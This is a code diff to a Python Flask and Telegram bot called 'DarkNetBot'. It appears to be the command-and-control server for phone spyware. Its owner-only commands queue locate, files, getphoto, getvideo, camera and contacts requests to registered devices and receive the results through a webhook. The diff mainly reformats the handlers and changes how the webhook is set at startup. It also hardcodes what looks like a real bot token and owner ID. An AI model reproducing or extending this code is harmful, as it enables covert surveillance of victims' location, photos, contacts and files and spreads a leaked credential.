@@ -7,17 +7,17 @@ import io
 import logging
 from flask import Flask, request, jsonify
 
-# ===== LOGGING SETUP =====
-logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
+# ===== LOGGING =====
+logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
 logger = logging.getLogger("DarkNetBot")
 
-# ===== CONFIGURATION =====
+# ===== CONFIG =====
 BOT_TOKEN = "8811118034:AAH2sIRrIgGq1yH6PqelH9mKJrzwkHK_jIs"
 OWNER_ID = 2062068620
 PUBLIC_URL = "https://burhan-spy-bot-production.up.railway.app"
 PORT = int(os.environ.get('PORT', 8080))
 
-# ===== DATABASE (Railway /tmp) =====
+# ===== DATABASE =====
 DB_PATH = "/tmp/devices.db"
 conn = sqlite3.connect(DB_PATH, check_same_thread=False)
 c = conn.cursor()
@@ -36,7 +36,7 @@ app = Flask(__name__)
 # ===== COMMAND QUEUE =====
 device_commands = {}
 
-# ===== HELPER FUNCTIONS =====
+# ===== HELPERS =====
 def db_add_device(device_id, key, expiry):
     try:
         c.execute("INSERT OR REPLACE INTO devices (device_id, key, expiry, registered_at) VALUES (?, ?, ?, ?)",
@@ -81,19 +81,10 @@ Commands:
 """
     bot.reply_to(message, text)
 
-@bot.message_handler(commands=['locate'])
-def locate(message):
-    if not is_owner(message): return
-    try:
-        device_id = message.text.split()[1]
-        send_command(device_id, "locate")
-        bot.reply_to(message, f"📍 Locate request sent to {device_id}")
-    except:
-        bot.reply_to(message, "Usage: /locate <device_id>")
-
 @bot.message_handler(commands=['devices'])
 def devices(message):
-    if not is_owner(message): return
+    if not is_owner(message):
+        return
     rows = db_get_all_devices()
     if not rows:
         bot.reply_to(message, "No devices registered.")
@@ -103,9 +94,21 @@ def devices(message):
         text += f"ID: {row[0]} | Key: {row[1]} | Expiry: {row[2]}\n"
     bot.reply_to(message, text)
 
+@bot.message_handler(commands=['locate'])
+def locate(message):
+    if not is_owner(message):
+        return
+    try:
+        device_id = message.text.split()[1]
+        send_command(device_id, "locate")
+        bot.reply_to(message, f"📍 Locate request sent to {device_id}")
+    except:
+        bot.reply_to(message, "Usage: /locate <device_id>")
+
 @bot.message_handler(commands=['files'])
 def files(message):
-    if not is_owner(message): return
+    if not is_owner(message):
+        return
     try:
         device_id = message.text.split()[1]
         send_command(device_id, "files")
@@ -115,7 +118,8 @@ def files(message):
 
 @bot.message_handler(commands=['getphoto'])
 def getphoto(message):
-    if not is_owner(message): return
+    if not is_owner(message):
+        return
     try:
         parts = message.text.split()
         device_id = parts[1]
@@ -127,7 +131,8 @@ def getphoto(message):
 
 @bot.message_handler(commands=['getvideo'])
 def getvideo(message):
-    if not is_owner(message): return
+    if not is_owner(message):
+        return
     try:
         parts = message.text.split()
         device_id = parts[1]
@@ -139,7 +144,8 @@ def getvideo(message):
 
 @bot.message_handler(commands=['camera'])
 def camera(message):
-    if not is_owner(message): return
+    if not is_owner(message):
+        return
     try:
         parts = message.text.split()
         device_id = parts[1]
@@ -151,7 +157,8 @@ def camera(message):
 
 @bot.message_handler(commands=['ping'])
 def ping(message):
-    if not is_owner(message): return
+    if not is_owner(message):
+        return
     try:
         device_id = message.text.split()[1]
         send_command(device_id, "ping")
@@ -161,13 +168,15 @@ def ping(message):
 
 @bot.message_handler(commands=['stats'])
 def stats(message):
-    if not is_owner(message): return
+    if not is_owner(message):
+        return
     rows = db_get_all_devices()
     bot.reply_to(message, f"📊 Total devices: {len(rows)}")
 
 @bot.message_handler(commands=['contacts'])
 def contacts(message):
-    if not is_owner(message): return
+    if not is_owner(message):
+        return
     try:
         device_id = message.text.split()[1]
         send_command(device_id, "contacts")
@@ -233,19 +242,25 @@ def post_result():
 @app.route('/webhook', methods=['POST'])
 def webhook():
     try:
-        logger.info("WEBHOOK HIT!")
+        logger.info(">>> WEBHOOK HIT <<<")
         json_string = request.get_data().decode('utf-8')
-        logger.info(f"Update received: {json_string}")
+        logger.info(f"Update received: {json_string[:200]}")
         update = telebot.types.Update.de_json(json_string)
         bot.process_new_updates([update])
+        logger.info(">>> UPDATE PROCESSED <<<")
         return "ok", 200
     except Exception as e:
         logger.error(f"Webhook error: {e}")
         return "error", 500
 
-# ===== START =====
-if __name__ == "__main__":
-    bot.remove_webhook()
-    bot.set_webhook(url=f"{PUBLIC_URL}/webhook")
-    logger.info(f"Webhook set to: {PUBLIC_URL}/webhook")
-    app.run(host="0.0.0.0", port=PORT)
+@app.route('/ping', methods=['GET'])
+def ping():
+    return "pong", 200
+
+# ===== AUTO-SET WEBHOOK (Gunicorn-safe, no if __name__) =====
+bot.remove_webhook()
+bot.set_webhook(url=f"{PUBLIC_URL}/webhook")
+logger.info(f"Webhook set to: {PUBLIC_URL}/webhook")
+
+# ===== START (Gunicorn will call this) =====
+app.run(host="0.0.0.0", port=PORT)
